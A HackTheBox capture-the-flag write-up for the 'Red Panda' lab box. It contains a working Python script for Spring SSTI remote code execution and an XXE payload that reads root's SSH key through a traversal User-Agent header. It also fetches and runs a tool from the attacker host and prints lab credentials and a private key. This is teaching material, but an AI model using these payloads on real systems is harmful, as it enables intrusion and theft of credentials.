---
layout: post
title: HackTheBox - Red Panda
date: 2022-09-25 15:39 +0200
author: Arcee
tags: htb box easy SSTI
categories: [HackTheBox, Box]
---

![RedPanda](/assets/img/posts/htb-redpanda/redpanda.png)

Easy Linux Box on HackTheBox that requires exploiting SSTI in a Java SpringFramework application via a searchb ar on the webpage for RCE and then initial access. For privesc we use a generated image and an XXE XML file that leaks the root ssh key.

## Box Info:

Name: Red Panda

Release date: 09-06-2022

OS: Linux

Solve date: 25-9-2022

## Enumeration

Nmap results: 

```bash
$ nmap -sC -sV -p- 10.10.11.170 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 14:29 CEST
Nmap scan report for 10.10.11.170
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sun, 25 Sep 2022 12:30:05 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sun, 25 Sep 2022 12:30:05 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 25 Sep 2022 12:30:05 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web enumeration

First we check the webpage on port 8080. Which gives us a search bar where we can search for a text.

![Webpage](/assets/img/posts/htb-redpanda/webpage.png)

![Search Result](/assets/img/posts/htb-redpanda/searchresults.png)

SQL injection doest not appear to work. However, Server-Side Template Injection (SSTI) does work.

Example when trying to submit `#{7*7}`:

![Input1](/assets/img/posts/htb-redpanda/search1.png)

Inputting `*{7*7}` gives cleaner output. But inputting `*{7*'7'}` we get an error page. This shows us that the program is not a Python program. We google the text on the error page and find that it is used in SpringFramework : [https://www.yawintutor.com/application-has-no-explicit-mapping-for-error-whitelabel-error-page-with-status-404/](https://www.yawintutor.com/application-has-no-explicit-mapping-for-error-whitelabel-error-page-with-status-404/)

We can find a SpringFramework’s SSTI cheatsheet here: [https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md)

We test if it works with `*{"dfd".replace("d","x")}` 

![Input2](/assets/img/posts/htb-redpanda/search2.png)

Some testing leads to the fact that characters like _ and % are banned.

## User flag

We now want to get a reverse shell. We can do this by using an automation script we found online: 

```bash
#!/usr/bin/python3
import requests
from cmd import Cmd
from bs4 import BeautifulSoup

class RCE(Cmd):
    prompt = "\033[1;31m$\033[1;37m "
    def decimal(self, args):
        comando = args
        decimales = []

        for i in comando:
            decimales.append(str(ord(i)))
        payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % decimales[0]

        for i in decimales[1:]:
            payload += ".concat(T(java.lang.Character).toString({}))".format(i)

        payload += ").getInputStream())}"
        data = { "name": payload }
        requer = requests.post("http://10.10.11.170:8080/search", data=data)
        parser = BeautifulSoup(requer.content, 'html.parser')
        grepcm = parser.find_all("h2")[0].get_text()
        result = grepcm.replace('You searched for:','').strip()
        print(result)

    def default(self, args):
        try:
            self.decimal(args)
        except:
            print("%s: command not found" % (args))

RCE().cmdloop()
```

If we run this using `python3 [exploit.py](http://exploit.py)` we get a reverse shell:

```bash
$ python3 exploit.py                
$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)                                  
$ hostname -I                                                                                     
10.10.11.170 dead:beef::250:56ff:feb9:531d                                                        
$ cat /home/woodenk/user.txt                                                                             
64****************************c6                                                              
```

We have now found the user flag. 

## Privilege Escalation

We can search through the files for the panda. In the [MainController.java](http://MainController.java) we find credentials”

```bash
$ cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java         
package com.panda_search.htb.panda_search;                                                          
                                                                                                    
import java.util.ArrayList;                                                                         
import java.io.IOException;                                                                         
import java.sql.*;                                                                                  
import java.util.List;                                                                              
import java.util.ArrayList;                                                                         
import java.io.File;                                                                                
import java.io.InputStream;                                                                         
import java.io.FileInputStream;                                                                     
                                                                                                    
import org.springframework.stereotype.Controller;                                                   
import org.springframework.ui.Model;                                                                
import org.springframework.web.bind.annotation.GetMapping;                                          
import org.springframework.web.bind.annotation.PostMapping;                                         
import org.springframework.web.bind.annotation.RequestParam;                                        
import org.springframework.web.bind.annotation.RestController;                                      
import org.springframework.web.bind.annotation.ResponseBody;                                        
import org.springframework.web.servlet.ModelAndView;                                                
import org.springframework.http.MediaType;                                                          
                                                                                                    
import org.apache.commons.io.IOUtils;                                                               
                                                                                                    
import org.jdom2.JDOMException;                                                                     
import org.jdom2.input.SAXBuilder;                                                                  
import org.jdom2.output.Format;                                                                     
import org.jdom2.output.XMLOutputter;                                                               
import org.jdom2.*;                                                                                 
                                                                                                    
@Controller                                                                                         
public class MainController {                                                                       
  @GetMapping("/stats")                                                                             
        public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException{                                                            
                SAXBuilder saxBuilder = new SAXBuilder();                                           
                if(author == null)                                                                  
                author = "N/A";                                                                     
                author = author.strip();                                                            
                System.out.println('"' + author + '"');                                             
                if(author.equals("woodenk") || author.equals("damian"))                             
                {                                                                                   
                        String path = "/credits/" + author + "_creds.xml";                          
                        File fd = new File(path);                                                   
                        Document doc = saxBuilder.build(fd);                                        
                        Element rootElement = doc.getRootElement();                                 
                        String totalviews = rootElement.getChildText("totalviews");                 
                        List<Element> images = rootElement.getChildren("image");                    
                        for(Element image: images)                                                  
                                System.out.println(image.getChildText("uri"));                      
                        model.addAttribute("noAuthor", false);                                      
                        model.addAttribute("author", author);                                       
                        model.addAttribute("totalviews", totalviews);                               
                        model.addAttribute("images", images);                                       
                        return new ModelAndView("stats.html");                                      
                }                                                                                   
                else                                                                                
                {                                                                                   
                        model.addAttribute("noAuthor", true);                                       
                        return new ModelAndView("stats.html");                                      
                }                                                                                   
        }                                                                                           
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)             
        public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {                                                                      
                                                                                                    
                System.out.println("Exporting xml of: " + author);                                  
                if(author.equals("woodenk") || author.equals("damian"))                             
                {                                                                                   
                        InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");  
                        System.out.println(in);                                                     
                        return IOUtils.toByteArray(in);                                             
                }                                                                                   
                else                                                                                
                {                                                                                   
                        return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");     
                }                                                                                   
        }                                                                                           
  @PostMapping("/search")                                                                           
        public ModelAndView search(@RequestParam("name") String name, Model model) {                
        if(name.isEmpty())                                                                          
        {                                                                                           
                name = "Greg";                                                                      
        }                                                                                           
        String query = filter(name);                                                                
        ArrayList pandas = searchPanda(query);                                                      
        System.out.println("\n\""+query+"\"\n");                                                    
        model.addAttribute("query", query);                                                         
        model.addAttribute("pandas", pandas);                                                       
        model.addAttribute("n", pandas.size());                                                     
        return new ModelAndView("search.html");                                                     
        }                                                                                           
  public String filter(String arg) {                                                                
        String[] no_no_words = {"%", "_","$", "~", };                                               
        for (String word : no_no_words) {                                                           
            if(arg.contains(word)){                                                                 
                return "Error occured: banned characters";                                          
            }                                                                                       
        }                                                                                           
        return arg;                                                                                 
    }                                                                                               
    public ArrayList searchPanda(String query) {                                                    
                                                                                                    
        Connection conn = null;                                                                     
        PreparedStatement stmt = null;                                                              
        ArrayList<ArrayList> pandas = new ArrayList();                                              
        try {                                                                                       
            Class.forName("com.mysql.cj.jdbc.Driver");                                              
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");                                                                                    
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");                                                                                             
            stmt.setString(1, "%" + query + "%");                                                   
            ResultSet rs = stmt.executeQuery();                                                     
            while(rs.next()){                                                                       
                ArrayList<String> panda = new ArrayList<String>();                                  
                panda.add(rs.getString("name"));                                                    
                panda.add(rs.getString("bio"));                                                     
                panda.add(rs.getString("imgloc"));                                                  
                panda.add(rs.getString("author"));                                                  
                pandas.add(panda);                                                                  
            }                                                                                       
        }catch(Exception e){ System.out.println(e);}                                                
        return pandas;                                                                              
    }                                                                                               
}
```

Specifically here: 

```bash
conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
```

We try to use these credentials to login via ssh, so we now are in a real shell.

```bash
$ ssh woodenk@10.10.11.170
woodenk@10.10.11.170's password: RedPandazRule
woodenk@redpanda:~$ cat user.txt 
7b8**************************11d
woodenk@redpanda:~$
```

We want to use pspy (https://github.com/DominicBreuker/pspy) to view the processes without having root permissions, as we do not have those. 

We first download the pspy64 executable, and host this on a simple http server on our own pc (in the folder where pspy is located):

```bash
python -m http.server 8000
```

Next, we download the pspy64 file on the shell and run it:

```bash
woodenk@redpanda:~$ cd /tmp
woodenk@redpanda:/tmp$ wget 10.10.14.5:8000/pspy64
--2022-09-25 12:51:36--  http://10.10.14.5:8000/pspy64
Connecting to 10.10.14.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                   100%[================================>]   2.94M  9.71MB/s    in 0.3s    

2022-09-25 12:51:37 (9.71 MB/s) - ‘pspy64’ saved [3078592/3078592]
woodenk@redpanda:/tmp$ chmod +x ./pspy64
woodenk@redpanda:/tmp$ ./pspy64
```

We see that sometimes a specific jar file is executed by root: 

```bash
2022/09/25 12:56:01 CMD: UID=0    PID=1707   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
```

We try to download that specific jar file:

```bash
woodenk@redpanda:/tmp$ cd ../../../../opt/credit-score/LogParser/final/target/                                     
woodenk@redpanda:/opt/credit-score/LogParser/final/target$ ls -la                                                   
total 1276                                                                                                          
drwxr-xr-x 6 root root    4096 Jun 20 16:04 .                                                                       
drwxrwxr-x 5 root root    4096 Jun 20 16:03 ..                                                                      
drwxr-xr-x 2 root root    4096 Jun 20 16:04 archive-tmp                                                             
drwxr-xr-x 3 root root    4096 Jun 20 16:03 classes                                                                 
-rw-r--r-- 1 root root 1280956 Jun 20 16:04 final-1.0-jar-with-dependencies.jar                                     
drwxr-xr-x 3 root root    4096 Jun 20 16:03 generated-sources                                                       
drwxr-xr-x 3 root root    4096 Jun 20 16:03 maven-status                                                                                                                                   
woodenk@redpanda:/opt/credit-score/LogParser/final/target$ python3 -m http.server 8000
```

We navigate to 10.10.11.170:8000 and download the jar. 

### Looking through the jar

We open the jar in jd-gui. We can find the app code in the com/logparser/App.class file. Which shows the main function: 

```bash
public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
    File log_fd = new File("/opt/panda_search/redpanda.log");
    Scanner log_reader = new Scanner(log_fd);
    while (log_reader.hasNextLine()) {
      String line = log_reader.nextLine();
      if (!isImage(line))
        continue; 
      Map parsed_data = parseLog(line);
      System.out.println(parsed_data.get("uri"));
      String artist = getArtist(parsed_data.get("uri").toString());
      System.out.println("Artist: " + artist);
      String xmlPath = "/credits/" + artist + "_creds.xml";
      addViewTo(xmlPath, parsed_data.get("uri").toString());
    } 
  }

public static Map parseLog(String line) {
    String[] strings = line.split("\\|\\|");
    Map<Object, Object> map = new HashMap<>();
    map.put("status_code", Integer.valueOf(Integer.parseInt(strings[0])));
    map.put("ip", strings[1]);
    map.put("user_agent", strings[2]);
    map.put("uri", strings[3]);
    return map;
  }
```

Here we see that /opt/panda_search/redpanda.log is being read. This code will be read line after line. There are a few checks that a line has to pass:

1. The line must containe .jpg in the string (isImage)
2. Next parselog is called where the `split()` is done on the string where ‘||’ is the delimeter. The string must be split into four strings, where the first must be a number, and the fourth must point to an existing .jpg file. 
3. The .jpg’s file’s metadata tag ‘Artist’ must have a value that matched to /credits/<author_name>_creds.xml. Since the current user does not have WRITE access to /credits., we have to set the Artist value to ‘../tmp/gg/” where our XML exploit will be at /tmp/gg_credits.xml’
4. The JPG file should be in a folder where the current user has WRITE access. Which we can use /tmp for. 

## Creating an exploit jpg:

We create a file that we upload to the machine:

```bash
❯ wget "https://avatars.githubusercontent.com/u/95899548?v=4"
Longitud: 33411 (33K) [image/jpeg]
Grabando a: «95899548?v=4»

95899548?v=4               100%[====================================>]       

«95899548?v=4» guardado [33411/33411]

❯ mv 95899548\?v=4 gato.jpg
❯ exiftool -Artist="../home/woodenk/privesc" gato.jpg
    1 image files updated
❯ scp gato.jpg woodenk@10.10.11.170:.
woodenk@10.10.11.170's password: RedPandazRule
gato.jpg
```

Next, we create the xml file that points to the root id_rsa file with the named defined in the image. 

```bash
woodenk@redpanda:~$ cat privesc_creds.xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY key SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/gato.jpg</uri>
    <privesc>&key;</privesc>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Now we have to make a curl request with the format that we saw in the file as User-Agent:

```bash
curl http://10.10.11.170:8080 -H "User-Agent: ||/../../../../../../../home/woodenk/gato.jpg"
```

We reload a random image on the webpage and then cat the xml again after a few seconds, when it should contain the root flag. 

```bash
woodenk@redpanda:~$ cat privesc_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!--?xml version="1.0" ?-->
<!DOCTYPE replace>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/gato.jpg</uri>
    <privesc>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</privesc>
    <views>2</views>
  </image>
  <totalviews>2</totalviews>
</credits>
```

We save the rsa key to id_rsa and use this to log in as root. When we first try to log in we get an error that the private key file is unprotected:

```bash
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
root@10.10.11.170's password:
```

To fix this we need to make sure that the key is only read-writeable by us: `chmod 600 id_rsa`

When we again try to log in we get: 

```bash
$ ssh root@10.10.11.170 -i id_rsa
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)
root@redpanda:~# id
uid=0(root) gid=0(root) groups=0(root)
root@redpanda:~# hostname -I
10.10.11.170 dead:beef::250:56ff:feb9:531d 
root@redpanda:~# cat root.txt
44****************************2d
```

And that gives us the root flag!
